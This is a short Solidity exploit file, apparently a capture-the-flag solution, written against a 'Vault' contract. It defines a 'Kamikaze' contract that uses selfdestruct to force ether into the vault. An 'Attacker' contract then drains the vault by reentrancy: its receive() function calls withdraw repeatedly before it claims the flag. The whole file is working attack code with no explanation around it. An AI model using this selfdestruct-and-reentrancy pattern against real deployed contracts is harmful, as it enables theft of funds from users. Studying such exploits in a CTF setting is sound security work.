pragma solidity ^0.8.0;
import "./Vault.sol";

contract Kamikaze {
    constructor(address receiver)payable{
        selfdestruct(payable(receiver));
    }

}

contract Attacker {
    Vault _vault;
    bool ok;
    int counter;
    constructor(Vault vault){
        _vault=vault;
    }

    function attack() external payable {
        require(msg.value==0.1 ether,"not enough to get the flag");
        new Kamikaze{ value: msg.value}(address(_vault));
        _vault.withdraw(0,address(this),address(this));
        _vault.captureTheFlag(msg.sender);
    }

    receive() external payable { if(counter<10){
     unchecked{++counter;}
     _vault.withdraw(0,address(this),address(this));
     }  
     }
}
